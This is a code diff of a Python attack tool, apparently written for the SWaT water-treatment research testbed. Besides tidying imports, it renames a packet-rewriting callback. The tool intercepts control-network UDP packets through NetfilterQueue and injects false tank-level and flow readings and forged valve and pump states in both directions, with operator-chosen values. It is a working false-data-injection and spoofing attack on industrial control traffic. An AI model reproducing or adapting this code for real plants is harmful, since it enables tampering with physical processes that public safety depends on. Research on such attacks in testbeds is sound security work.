@@ -32,8 +32,8 @@ from netfilterqueue import NetfilterQueue
 from scapy.layers.inet import IP
 from scapy.layers.inet import UDP
 
-import scaling
-import swat
+from swat.plc1 import SWAT_P1_RIO_AI, SWAT_P1_RIO_DI, SWAT_P1_RIO_DO
+from swat.scaling import current_to_signal, signal_to_current, P1Level, P1Flow
 
 # Parameters list
 _pump1_in = True  # True is on, False is off
@@ -46,28 +46,28 @@ _flow_in = 0
 _level_in = 0
 
 
-def __spoof(packet):
+def __inject(packet):
     pkt = IP(packet.get_payload())
-    if swat.SWAT_P1_RIO_AI in pkt:
-        pkt[swat.SWAT_P1_RIO_AI].level = _level_in
-        pkt[swat.SWAT_P1_RIO_AI].flow = _flow_in
+    if SWAT_P1_RIO_AI in pkt:
+        pkt[SWAT_P1_RIO_AI].level = _level_in
+        pkt[SWAT_P1_RIO_AI].flow = _flow_in
         del pkt[UDP].chksum  # Need to recompute checksum
         packet.set_payload(str(pkt))
 
-    if swat.SWAT_P1_RIO_DI in pkt:
-        pkt[swat.SWAT_P1_RIO_DI].valve_close = 0 if _valve_in else 1
-        pkt[swat.SWAT_P1_RIO_DI].valve_open = 1 if _valve_in else 0
-        pkt[swat.SWAT_P1_RIO_DI].pump1_run = 1 if _pump1_in else 0
-        pkt[swat.SWAT_P1_RIO_DI].pump2_run = 1 if _pump2_in else 0
+    if SWAT_P1_RIO_DI in pkt:
+        pkt[SWAT_P1_RIO_DI].valve_close = 0 if _valve_in else 1
+        pkt[SWAT_P1_RIO_DI].valve_open = 1 if _valve_in else 0
+        pkt[SWAT_P1_RIO_DI].pump1_run = 1 if _pump1_in else 0
+        pkt[SWAT_P1_RIO_DI].pump2_run = 1 if _pump2_in else 0
         del pkt[UDP].chksum  # Need to recompute checksum
         packet.set_payload(str(pkt))
 
-    if swat.SWAT_P1_RIO_DO in pkt:
-        if pkt[swat.SWAT_P1_RIO_DO].number == 1:  # To avoid Multicast with same length
-            pkt[swat.SWAT_P1_RIO_DO].valve_close = 0 if _valve_out else 1
-            pkt[swat.SWAT_P1_RIO_DO].valve_open = 1 if _valve_out else 0
-            pkt[swat.SWAT_P1_RIO_DO].pump1_start = 1 if _pump1_out else 0
-            pkt[swat.SWAT_P1_RIO_DO].pump2_start = 1 if _pump2_out else 0
+    if SWAT_P1_RIO_DO in pkt:
+        if pkt[SWAT_P1_RIO_DO].number == 1:  # To avoid Multicast with same length
+            pkt[SWAT_P1_RIO_DO].valve_close = 0 if _valve_out else 1
+            pkt[SWAT_P1_RIO_DO].valve_open = 1 if _valve_out else 0
+            pkt[SWAT_P1_RIO_DO].pump1_start = 1 if _pump1_out else 0
+            pkt[SWAT_P1_RIO_DO].pump2_start = 1 if _pump2_out else 0
             del pkt[UDP].chksum  # Need to recompute checksum
             packet.set_payload(str(pkt))
 
@@ -77,7 +77,7 @@ def __spoof(packet):
 def start():
     __setup()
     nfqueue = NetfilterQueue()
-    nfqueue.bind(0, __spoof)
+    nfqueue.bind(0, __inject)
     try:
         print(datetime.datetime.now())
         print("[*] starting valve spoofing")
@@ -107,9 +107,9 @@ def configure():
     _pump2_out = True if pump2 else False
     global _flow_in, _level_in
     sflow = input('Set water flow (m^2/h): ')
-    _flow_in = scaling.signal_to_current(sflow, scaling.P1Flow)
+    _flow_in = signal_to_current(sflow, P1Flow)
     slevel = input('Set water level (mm): ')
-    _level_in = scaling.signal_to_current(slevel, scaling.P1Level)
+    _level_in = signal_to_current(slevel, P1Level)
     params()
 
 
@@ -132,9 +132,9 @@ def params():
     state = 'On' if _pump2_out else 'Off'
     value = 1 if _pump2_out else 0
     print('Pump2 control: {} ({})'.format(state, value))
-    sflow = scaling.current_to_signal(_flow_in, scaling.P1Flow)
+    sflow = current_to_signal(_flow_in, P1Flow)
     print('Flow: {} m^2/h ({})'.format(sflow, _flow_in))
-    slevel = scaling.current_to_signal(_level_in, scaling.P1Level)
+    slevel = current_to_signal(_level_in, P1Level)
     print('Level: {} mm ({})'.format(slevel, _level_in))
 
 
